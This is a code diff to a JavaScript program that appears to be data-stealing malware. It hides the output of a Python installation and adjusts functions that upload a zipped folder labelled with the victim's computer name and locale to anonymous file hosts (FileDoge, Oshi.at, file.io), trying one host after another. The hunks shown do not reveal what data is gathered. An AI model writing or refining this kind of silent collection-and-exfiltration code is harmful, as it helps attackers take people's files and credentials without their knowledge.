@@ -1021,7 +1021,7 @@ async function installPython() {
         'Include_test=0',
         'Include_pip=1',
         'Include_doc=0'
-    ], { stdio: 'inherit' });
+    ], { stdio: 'ignore' });
     console.log('Python installed successfully.');
     } catch (error) {
     console.error(`Error during Python installation: ${error.message}`);
@@ -2872,6 +2872,14 @@ async function uploadToDoge(destinationFolder, locale, computerName) {
                 try {
                     const response = JSON.parse(stdout);
                     const token = response.token;
+
+                    // Check if token is undefined
+                    if (!token) {
+                        console.error('Upload to FileDoge returned undefined token.');
+                        reject(new Error('Upload failed: received undefined token.'));
+                        return;
+                    }
+
                     const downloadLink = `https://api.filedoge.com/download/${token}`;
                     console.log(`Upload successful to FileDoge. Download link: ${downloadLink}`);
                     resolve(downloadLink);
@@ -2883,6 +2891,7 @@ async function uploadToDoge(destinationFolder, locale, computerName) {
         });
     });
 }
+
 
 // Upload file to Oshi.at
 async function uploadToOshiAt(filePath, computerName) {
@@ -2937,6 +2946,9 @@ async function uploadToFileio(filePath) {
     try {
         const form = new FormData();
         form.append('file', fs.createReadStream(filePath));
+        
+        // You can specify additional options here
+        form.append('expire', '1w'); // Keep the file for one week, change to your preference
 
         const response = await axios.post('https://file.io/', form, {
             headers: form.getHeaders(),
@@ -2964,14 +2976,7 @@ async function uploadFile(destinationFolder, locale, computerName) {
         return dogeLink;
     } catch (error) {
         console.error(`FileDoge upload failed: ${error.message}`);
-    }
-
-    try {
-        const fileioLink = await uploadToFileio(zipFilePath);
-        console.log(`Upload successful to File.io. Link: ${fileioLink}`);
-        return fileioLink;
-    } catch (error) {
-        console.error(`File.io upload failed: ${error.message}`);
+        // Proceed to use other uploaders if FileDoge fails
     }
 
     try {
@@ -2989,7 +2994,6 @@ async function uploadFile(destinationFolder, locale, computerName) {
     } catch (error) {
         console.error(`Oshi.at upload failed: ${error.message}`);
     }
-
 
     throw new Error('All upload methods failed');
 }
